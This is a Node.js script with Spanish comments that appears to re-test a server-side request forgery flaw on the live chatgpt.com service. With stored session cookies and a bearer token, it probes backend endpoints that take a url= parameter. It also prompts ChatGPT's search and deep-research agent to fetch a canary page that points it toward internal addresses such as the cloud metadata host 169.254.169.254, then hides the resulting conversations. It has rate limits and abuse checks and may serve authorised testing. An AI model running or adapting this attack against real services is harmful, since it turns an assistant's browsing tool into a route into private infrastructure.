'use strict';
// retest-ssrf-302.js — Re-test de la variante SSRF (302 + header custom) sobre
// superficies de fetch server-side ACTIVAS de chatgpt.com (search, deep_research).
//
//   CANARIO_BASE=https://canario.example node backend/retest-ssrf-302.js
//
// Sin CANARIO_BASE: ejecuta solo la parte API (V-ssrf-3, sondeos de endpoints)
// y deja preparadas las plantillas de conversación para V-ssrf-1/V-ssrf-2.
//
// Cumplimiento: compuerta de salud, ritmo >=2,2 s, max 2 deep research,
// NUNCA fetch interno por nuestra parte, canario propio, nonce por intento.
// ============================================================================
const fs = require('fs');
const path = require('path');
const net = require('./lib/net');
const { conAntiAbuso } = require('./lib/anti-abuso');
const salud = require('./ab-salud-sesiones'); // COMPUERTA OBLIGATORIA

const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0';
const EVID = path.join(__dirname, '..', 'evidencia-poc', 'http');
const OUT_JSON = path.join(EVID, 'ssrf-retest-resultado.json');
const OUT_RAW = path.join(EVID, 'ssrf-retest-raw.txt');
const CANARIO = process.env.CANARIO_BASE || null;
const NONCE = 'SSRF1-' + Date.now().toString(36).toUpperCase();

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
function jarDeFichero(f) {
  const jar = {};
  for (const l of fs.readFileSync(f, 'utf8').split('\n').filter(Boolean)) {
    const [host, name, value] = l.split('\t');
    if (host === 'chatgpt.com' || host === '.chatgpt.com') jar[name] = value;
  }
  return Object.entries(jar).map(([k, v]) => `${k}=${v}`).join('; ');
}
async function llamada(metodo, ruta, cookies, bearer, body) {
  const headers = { 'User-Agent': UA, 'Cookie': cookies, 'Accept': 'application/json',
    'Accept-Language': 'es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7' };
  if (body) headers['Content-Type'] = 'application/json';
  if (bearer) headers['Authorization'] = 'Bearer ' + bearer;
  return conAntiAbuso(() => net.fetch('https://chatgpt.com' + ruta, { method: metodo, headers, body: body ? JSON.stringify(body) : null }), `${metodo} ${ruta}`);
}
/** mensaje normalizado (UUID en id — requisito verificado en calibración E16) */
function mensaje(texto) {
  return {
    id: require('crypto').randomUUID(),
    author: { role: 'user' },
    content: { content_type: 'text', parts: [texto] },
    metadata: {},
  };
}
const HOSTS_INTERNOS = ['169.254.169.254', '10.0.0.1', '100.64.0.1'];

(async () => {
  console.log('── [salud] compuerta obligatoria de sesiones A/B (+ check 5 anti-abuso) ──');
  const h = await salud.comprobar({ quiet: true, conAntiAbuso: true });
  if (!h.ok) { console.error('⛔ salud NO superada:', h.razon); process.exit(3); }
  if (h.antiAbusoActivo) {
    console.error('🚩 Flag anti-abuso ACTIVO en /conversation (patrón E16) — V-ssrf-1/2 lo necesitan: AUTO-SALTEO sin gastar peticiones. Reintentar tras >=24 h de enfriamiento.');
    process.exit(4);
  }
  const jarA = jarDeFichero(path.join(EVID, 'sesion-cuenta-A-cookies.txt'));
  const bA = h.A.sesion.accessToken;
  console.log(`✅ salud OK (A=${h.A.sesion.userId}) · nonce=${NONCE} · canario=${CANARIO || '(no configurado: solo V-ssrf-3)'}`);

  const intentos = [];
  const raw = [`# SSRF re-test (302) — ${new Date().toISOString()} · nonce=${NONCE}`, ''];
  fs.writeFileSync(OUT_RAW, raw.join('\n'));

  // ── V-ssrf-3: sondear endpoints con parámetro url (API directa) ────────────
  const endpointsUrl = [
    '/backend-api/link_preview?url=%S',
    '/backend-api/files/ingest?url=%S',
    '/backend-api/conversation/url_info?url=%S',
    '/backend-api/preview?url=%S',
  ];
  if (CANARIO) {
    for (const ep of endpointsUrl) {
      const url = 'https://chatgpt.com' + ep.replace('%S', encodeURIComponent(CANARIO + '/step1?v=' + NONCE));
      const r = await net.fetch(url, { headers: { 'User-Agent': UA, 'Cookie': jarA, 'Accept': 'application/json' } });
      const line = `[v3] ${ep} → ${r.status} | ${(r.text || '').slice(0, 120)}`;
      console.log(line); raw.push(line);
      intentos.push({ vector: 'v3-endpoint', endpoint: ep, status: r.status, cuerpo: (r.text || '').slice(0, 200) });
      await sleep(3000);
    }
  } else {
    console.log('[v3] CANARIO_BASE no definido — omito sondeos de endpoints (requieren canario propio)');
  }

  // ── V-ssrf-1/2: prompts listos para conversación (requieren canario) ───────
  if (CANARIO) {
    for (const [i, host] of HOSTS_INTERNOS.entries()) {
      const prompt = `Busca en la web y resume el contenido de esta página: ${CANARIO}/step1?v=${NONCE}-${i}&next=${host}`;
      const body = { action: 'next', messages: [mensaje(prompt)], model: 'auto', timezone_offset_min: -120, timezone: 'Europe/Madrid', conversation_mode: { kind: 'primary_assistant' }, supports_buffering: true, supported_encodings: ['v1'], client_prepare_state: 'N/A', websocket_request_id: require('crypto').randomUUID() };
      const r = await llamada('POST', '/backend-api/conversation', jarA, bA, body);
      const convId = (r.json() || {}).conversation_id || null;
      const line = `[v1-${i}] host interno=${host} → conv=${r.status} id=${convId || 'n/a'}`;
      console.log(line); raw.push(line);
      intentos.push({ vector: `v1-search-${i}`, host_interno: host, status: r.status, convId });
      if (convId) { await sleep(3000); await llamada('PATCH', '/backend-api/conversation/' + convId, jarA, bA, { visible: false }); }
      await sleep(3000);
    }
  } else {
    raw.push(...HOSTS_INTERNOS.map((host, i) =>
      `[pendiente v1-${i}] prompt: "Busca en la web y resume el contenido de esta página: ${CANARIO || '<CANARIO>'}/step1?v=${NONCE}-${i}&next=${host}"`));
  }
  raw.push('', `[nota] deep_research (v2): máx 2 intentos, ejecutar manualmente con canario. Prompt: "Haz una deep research sobre historia de DNS incluyendo esta fuente: ${CANARIO || '<CANARIO>'}/step1?v=${NONCE}-dr"`);

  fs.writeFileSync(OUT_RAW, raw.join('\n'));
  fs.writeFileSync(OUT_JSON, JSON.stringify({
    ts: new Date().toISOString(), nonce: NONCE, canario: CANARIO,
    hostsInternos: HOSTS_INTERNOS, intentos,
    veredicto: intentos.some((i) => i.status === 200 && i.convId) ? 'iniciado — revisar respuestas del agente y log del canario' : 'sin ejecución real (canario no configurado o endpoints 404)',
  }, null, 2));
  console.log('\n✅ Resultado:', OUT_JSON);
})().catch((e) => { console.error('ERR', e.message); process.exit(1); });
